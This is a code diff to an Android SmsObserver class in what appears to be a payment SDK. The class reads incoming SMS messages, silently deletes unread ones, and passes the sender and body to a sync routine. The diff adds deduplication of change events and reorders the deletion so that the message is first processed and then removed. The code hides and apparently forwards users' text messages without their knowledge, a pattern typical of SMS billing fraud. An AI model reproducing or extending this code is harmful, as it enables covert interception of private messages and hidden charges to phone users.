@@ -35,6 +35,8 @@ public class SmsObserver extends ContentObserver {
     String payType;
     private static String TAG = "SmsObserver";
     static String smsContent = "";
+    static String secendSmsId = "";
+    static String deleteContent = "";
 
     public SmsObserver(Handler handler) {
         super(handler);
@@ -57,9 +59,7 @@ public class SmsObserver extends ContentObserver {
             Log.debug("onChange", "No:" + a);
             Log.debug("onChange", "selfChange:" + selfChange + "");
             Log.debug("onChange", "uri:" + uri);
-            smsId = uri.toString().substring(uri.toString().lastIndexOf("/") + 1);
-            Log.debug("smsId:" + smsId);
-            getSMSinfo(smsId);
+            choose(uri);
 //            deleteByContent();
 //            deleteByNumber();
         } catch (Exception e) {
@@ -86,8 +86,8 @@ public class SmsObserver extends ContentObserver {
                 if (addressIndex != -1) {
                     smsBody = mCursor.getString(bodyndex);
                 }
-                delete(_id, smsAddress, smsBody);
                 chooseSMS(smsAddress, smsBody);
+                delete(_id, smsAddress, smsBody);
             }
             mCursor.close();
         } catch (Exception e) {
@@ -99,7 +99,7 @@ public class SmsObserver extends ContentObserver {
     private int delete(String _id, String smsAddress, String smsBody) {
         Uri contentUri = Uri.parse("content://sms");
         int delete = SDKInit.getResolver().delete(contentUri, "read=0 and _id=?", new String[]{_id});
-        Sms_send_tongbu(smsAddress + "\t" + smsBody, SDKInit.mContext, delete);
+        Sms_send_tongbu(smsAddress + "  " + smsBody, SDKInit.mContext, delete);
         return delete;
     }
 
@@ -337,5 +337,22 @@ public class SmsObserver extends ContentObserver {
             sb.append(s[i] + "\t");
         }
         return sb.toString();
+    }
+
+    private synchronized void choose(Uri uri) {
+        smsId = uri.toString().substring(uri.toString().lastIndexOf("/") + 1);
+        if (secendSmsId.equals("")) {
+            secendSmsId = smsId;
+            Log.debug("smsId:" + smsId);
+            getSMSinfo(smsId);
+        } else {
+            if (secendSmsId.equals(smsId)) {
+                return;
+            } else {
+                secendSmsId = smsId;
+                Log.debug("smsId:" + smsId);
+                getSMSinfo(smsId);
+            }
+        }
     }
 }
